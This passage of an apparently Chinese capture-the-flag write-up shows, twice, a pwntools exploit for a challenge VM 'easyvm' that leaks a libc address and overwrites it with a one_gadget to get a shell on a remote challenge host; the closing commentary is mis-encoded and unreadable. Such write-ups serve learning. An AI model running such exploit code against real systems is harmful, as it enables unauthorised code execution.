style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">173.33.5.3</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 9999</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    b *0x4022F3</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pack</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">op</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p8</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 2</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> push</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#393A34"> reg </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> pop</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#393A34"> reg </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> mv_reg</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> load_reg</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> add</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> mul</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">7</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> div</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> load</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg1</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">12</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> store</span><span style="color:#2993a3">(</span><span style="color:#393A34">reg2</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> pack</span><span style="color:#2993a3">(</span><span style="color:#2F798A">13</span><span style="color:#999999">,</span><span style="color:#393A34"> reg1 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#999999">,</span><span style="color:#393A34"> reg2 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ff</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> readimm</span><span style="color:#2993a3">(</span><span style="color:#393A34">target</span><span style="color:#999999">,</span><span style="color:#393A34"> zero_reg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> load_reg</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> target</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">+=</span><span style="color:#393A34"> div</span><span style="color:#2993a3">(</span><span style="color:#393A34">zero_reg</span><span style="color:#999999">,</span><span style="color:#393A34"> zero_reg</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">+=</span><span style="color:#393A34"> mul</span><span style="color:#2993a3">(</span><span style="color:#393A34">zero_reg</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> read64</span><span style="color:#2993a3">(</span><span style="color:#393A34">target</span><span style="color:#999999">,</span><span style="color:#393A34"> zero_reg</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    res </span><span style="color:#999999">=</span><span style="color:#393A34"> readimm</span><span style="color:#2993a3">(</span><span style="color:#393A34">target</span><span style="color:#999999">,</span><span style="color:#393A34"> zero_reg</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    res </span><span style="color:#999999">+=</span><span style="color:#393A34"> load</span><span style="color:#2993a3">(</span><span style="color:#393A34">zero_reg</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> res</span><br><br><span style="color:#A0ADA0"># def write32()</span><br><span style="color:#A0ADA0"># code: 0x4062d0 0x1800</span><br><span style="color:#A0ADA0"># mem: 0x407ae0 0x40</span><br><span style="color:#A0ADA0"># stack: 0x407b30 0x900</span><br><span style="color:#A0ADA0"># vm: 0x406290 0x20</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">""</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> readimm</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">405028</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> load</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> readimm</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">7ffff7c00000</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ebd43</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7ffff7c80e50</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> add</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> store</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">code:</span><span style="color:#A65E2B">\n\t</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./easyvm</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">173.33.5.3</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 9999</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">G</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">attach</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> """</span><br><span style="color:#C98A7D">    b *0x4022F3</span><br><span style="color:#C98A7D77">    """</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pack</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">op</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p8</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#4C9A91"> 2</span><span style="color:#CB7676"> +</span><span style="color:#DBD7CAEE"> p64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> push</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> pop</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> mv_reg</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> load_reg</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">4</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> add</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">5</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> mul</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">7</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> div</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">8</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> load</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">12</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> store</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">reg2</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> pack</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">13</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg1 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> reg2 </span><span style="color:#CB7676">&#x26;</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ff</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> readimm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> zero_reg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> load_reg</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> target</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> div</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">zero_reg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> zero_reg</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> mul</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">zero_reg</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> read64</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> zero_reg</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> readimm</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">target</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> zero_reg</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    res </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> load</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">zero_reg</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#DBD7CAEE"> res</span><br><br><span style="color:#758575DD"># def write32()</span><br><span style="color:#758575DD"># code: 0x4062d0 0x1800</span><br><span style="color:#758575DD"># mem: 0x407ae0 0x40</span><br><span style="color:#758575DD"># stack: 0x407b30 0x900</span><br><span style="color:#758575DD"># vm: 0x406290 0x20</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">=</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">""</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> readimm</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">405028</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> load</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> readimm</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">7ffff7c00000</span><span style="color:#CB7676"> +</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">ebd43</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">7ffff7c80e50</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> add</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">3</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">payload </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> store</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 3</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">code:</span><span style="color:#C99076">\n\t</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> payload</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>æˆ‘åˆçŠ¯ç—…äº†ï¼Œä¸€å¼€å§‹æ‹¿åˆ°ä»»æ„å†™åŸè¯­ä¹‹åï¼Œè¯•äº†ä¸€ä¸ª oggï¼Œå‘ç°æ‰“ä¸é€šï¼Œå°±ä»¥ä¸ºæ ˆæœ‰é—®é¢˜æ‰“ä¸äº† oggï¼Œç„¶åå»æ‰“ io äº†ï¼Œåæ¥å‘ç°ç¬¬ä¸€é“é¢˜åšçš„æ¯”æˆ‘æ…¢çš„è¿™é“é¢˜å±…ç„¶ä¸€è¡€äº†æ‰ååº”è¿‡æ¥ã€‚ã€‚ã€‚åº”è¯¥å…¨å°è¯•ä¸€éã€‚</p>
<h4 id="hardllvm" class="scroll-target"><a href="#hardllvm"><code class="hash inline-code">#</code>hardllvm</a></h4>
